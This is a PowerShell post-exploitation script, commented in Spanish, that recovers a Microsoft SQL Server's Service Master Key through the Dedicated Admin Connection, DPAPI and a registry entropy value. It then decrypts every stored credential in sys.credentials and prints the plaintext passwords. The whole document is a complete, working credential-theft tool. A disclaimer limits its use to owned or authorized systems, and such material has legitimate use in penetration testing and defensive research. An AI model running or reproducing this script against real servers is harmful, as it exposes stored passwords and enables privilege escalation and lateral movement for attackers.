<#
.SYNOPSIS
    Descifra las credenciales almacenadas en un Microsoft SQL Server
    recuperando la Service Master Key (SMK) protegida con DPAPI.

.DESCRIPTION
    SQL Server guarda los secretos de `sys.credentials` (y de los linked
    servers) cifrados con AES usando una clave derivada de la Service
    Master Key. La SMK, a su vez, está protegida con DPAPI a nivel de
    máquina, con una entropía que el servicio guarda en el registro.

    El script, ejecutado en el propio host con privilegios de administrador
    local (o de la cuenta de servicio de SQL):

      1. Abre la Dedicated Admin Connection (DAC) por loopback.
      2. Lee la SMK cruda de `sys.key_encryptions` (key_id 102).
      3. Localiza el blob DPAPI real DENTRO del campo — SQL antepone una
         cabecera propia de varios bytes antes del "magic" DPAPI
         (01 00 00 00  D0 8C 9D DF). Saltarse esa cabecera es el detalle
         que hace que el Unprotect no falle.
      4. Descifra la SMK con DPAPI (ProtectedData.Unprotect, LocalMachine)
         usando la entropía del registro; los últimos 32 bytes son la clave AES.
      5. Descifra cada credencial (AES-256-CBC, sin padding, texto en UTF-16LE).

    Es una técnica post-explotación conocida; úsala solo en sistemas
    propios o en laboratorios con autorización explícita.

.PARAMETER InstanceName
    Nombre de la instancia tal y como aparece en el registro, p. ej.
    "MSSQL17.MSSQLSERVER" o "MSSQL15.SQLEXPRESS".

.NOTES
    Autor : Josué (https://josueviillaa.github.io)
    Requisitos: ejecutar en el host de SQL Server, PowerShell con
    privilegios suficientes para abrir la DAC y leer la clave del registro.

.DISCLAIMER
    Software educativo y de investigación en seguridad, entregado «TAL CUAL»,
    SIN GARANTÍA de ningún tipo. Úsalo ÚNICAMENTE sobre sistemas de tu
    propiedad o con autorización expresa y por escrito. Su uso es
    responsabilidad exclusiva de quien lo ejecuta; el autor no se
    responsabiliza del uso indebido ni de los daños que puedan derivarse.
    El acceso no autorizado a sistemas informáticos es un delito.
    Licencia MIT — ver el fichero LICENSE del repositorio.
#>

[CmdletBinding()]
param(
    [string]$InstanceName = "MSSQL17.MSSQLSERVER"
)

$ErrorActionPreference = "Stop"

Write-Host "[*] Abriendo DAC local (loopback)..."
$C = New-Object System.Data.SqlClient.SqlConnection
$C.ConnectionString = "Server=ADMIN:127.0.0.1;Database=master;Integrated Security=SSPI;"
$C.Open()
Write-Host "[+] DAC:" $C.State

$cmd = $C.CreateCommand()
$cmd.CommandText = "SELECT crypt_property FROM sys.key_encryptions WHERE key_id=102 AND (thumbprint=0x03 OR thumbprint=0x0300000001)"
$smk = $cmd.ExecuteScalar()
if (-not $smk) {
    $cmd.CommandText = "SELECT TOP 1 crypt_property FROM sys.key_encryptions WHERE key_id=102"
    $smk = $cmd.ExecuteScalar()
}
Write-Host "[*] SMK cruda:" $smk.Length "bytes"

[byte[]]$ent = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$InstanceName\Security\").Entropy
Write-Host "[*] Entropia:" $ent.Length "bytes"

# --- Localizar la cabecera DPAPI real dentro del campo -------------------
# SQL Server antepone bytes propios antes del blob DPAPI. Buscamos el magic
# (01 00 00 00  D0 8C 9D DF) y recortamos todo lo anterior antes de descifrar.
$off = -1
for ($i = 0; $i -le $smk.Length - 8; $i++) {
    if ($smk[$i]   -eq 0x01 -and $smk[$i+4] -eq 0xd0 -and
        $smk[$i+5] -eq 0x8c -and $smk[$i+6] -eq 0x9d -and $smk[$i+7] -eq 0xdf) {
        $off = $i; break
    }
}
Write-Host "[*] Magic DPAPI en offset:" $off
if ($off -lt 0) { Write-Host "[X] No se encontro la cabecera DPAPI"; $C.Close(); exit }

[byte[]]$blob = $smk[$off..($smk.Length - 1)]

Add-Type -AssemblyName System.Security
$key = $null
foreach ($e in @($ent, $null)) {
    try {
        $key = [Security.Cryptography.ProtectedData]::Unprotect($blob, $e, 'LocalMachine')
        Write-Host "[+] SMK descifrada:" $key.Length "bytes"
        break
    } catch {
        Write-Host "[!] Unprotect fallo:" $_.Exception.Message
    }
}
if (-not $key) { Write-Host "[X] No se pudo descifrar la SMK"; $C.Close(); exit }

# La clave AES son los ultimos 32 bytes de la SMK descifrada.
$aeskey = $key[($key.Length - 32)..($key.Length - 1)]

$cmd.CommandText = @"
SELECT name, credential_identity,
       substring(imageval, 5, 16) AS iv,
       substring(imageval, 21, DATALENGTH(imageval) - 20) AS pass
FROM sys.credentials cred
INNER JOIN sys.sysobjvalues obj ON cred.credential_id = obj.objid
WHERE valclass = 28 AND valnum = 2
"@
$r = $cmd.ExecuteReader()

$aes = New-Object Security.Cryptography.AesCryptoServiceProvider
$aes.Padding = "None"
$aes.Mode    = "CBC"
$aes.Key     = $aeskey

Write-Host "`n===== RESULTADOS =====`n"
while ($r.Read()) {
    $name = $r['name']; $user = $r['credential_identity']
    [byte[]]$iv = $r['iv']; [byte[]]$ct = $r['pass']
    Write-Host "Credential :" $name
    Write-Host "Usuario    :" $user
    try {
        $aes.IV = $iv
        $d  = $aes.CreateDecryptor()
        $ms = New-Object IO.MemoryStream
        $cs = New-Object Security.Cryptography.CryptoStream($ms, $d, "Write")
        $cs.Write($ct, 0, $ct.Length)
        $cs.FlushFinalBlock()
        Write-Host "Password   :" ([Text.Encoding]::Unicode.GetString($ms.ToArray()))
    } catch {
        Write-Host "[!] decrypt fallo:" $_.Exception.Message
    }
    Write-Host ("-" * 40)
}
$r.Close(); $C.Close()
Write-Host "[*] Fin."
